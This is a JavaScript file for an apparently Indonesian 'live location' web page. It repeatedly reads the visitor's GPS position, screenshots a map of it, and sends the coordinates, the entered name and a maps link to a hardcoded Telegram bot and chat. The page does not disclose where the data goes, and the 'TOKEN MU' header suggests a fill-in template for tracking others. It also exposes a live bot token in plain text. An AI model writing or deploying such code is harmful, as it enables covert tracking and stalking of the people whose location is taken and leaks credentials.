// === TOKEN MU ===
const BOT_TOKEN = "8323987241:AAEkG2GyXGhZygjWzwlY5C5c4wcyQechfbM";
const CHAT_ID = "7548775199";

let map, marker;
let liveInterval;  // untuk interval update lokasi
let liveActive = false;

const btnMulai = document.getElementById("btnMulai");
const btnStop = document.getElementById("btnStop");

btnMulai.onclick = () => mulaiLive();
btnStop.onclick = () => stopLive();

function mulaiLive() {
    const nama = document.getElementById("nama").value.trim();
    if (nama === "") {
        alert("Isi nama dulu!");
        return;
    }

    document.getElementById("status").innerText = "Mengaktifkan live location...";
    liveActive = true;
    btnMulai.disabled = true;
    btnStop.style.display = "block";

    // Ambil lokasi pertama
    navigator.geolocation.getCurrentPosition(
        pos => {
            updateLokasi(nama, pos.coords.latitude, pos.coords.longitude);
            // Mulai interval 10 detik
            liveInterval = setInterval(() => {
                navigator.geolocation.getCurrentPosition(
                    p => updateLokasi(nama, p.coords.latitude, p.coords.longitude),
                    () => console.log("Gagal mengambil lokasi")
                );
            }, 1000); //
        },
        () => alert("Gagal mengambil lokasi!")
    );
}

function stopLive() {
    liveActive = false;
    clearInterval(liveInterval);
    document.getElementById("status").innerText = "Live location dihentikan.";
    btnMulai.disabled = false;
    btnStop.style.display = "none";
}

function updateLokasi(nama, lat, lon) {
    if (!liveActive) return;

    const mapDiv = document.getElementById("map");
    mapDiv.style.display = "block";

    if (!map) {
        map = L.map('map').setView([lat, lon], 17);
        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
            maxZoom: 19
        }).addTo(map);

        marker = L.marker([lat, lon]).addTo(map);
    } else {
        map.setView([lat, lon]);
        marker.setLatLng([lat, lon]);
    }

    document.getElementById("status").innerText =
        `Live… ${lat.toFixed(5)}, ${lon.toFixed(5)}`;

    setTimeout(() => screenshotDanKirim(nama, lat, lon), 1000);
}

async function screenshotDanKirim(nama, lat, lon) {
    if (!liveActive) return;

    const mapElement = document.getElementById("map");

    try {
        const canvas = await html2canvas(mapElement, {
            useCORS: true,
            allowTaint: true
        });

        const dataUrl = canvas.toDataURL("image/png");
        const blob = await fetch(dataUrl).then(res => res.blob());

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("caption",
`📍 Live Location Update

👤 Nama: ${nama}
🌍 Koordinat: ${lat}, ${lon}
🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`
        );
        form.append("photo", blob, "map.png");

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: form
        })
        .then(() => console.log("Terkirim ke Telegram!"))
        .catch(() => console.log("Gagal mengirim ke Telegram"));
    } catch (e) {
        console.log("Gagal screenshot map!", e);
    }
}
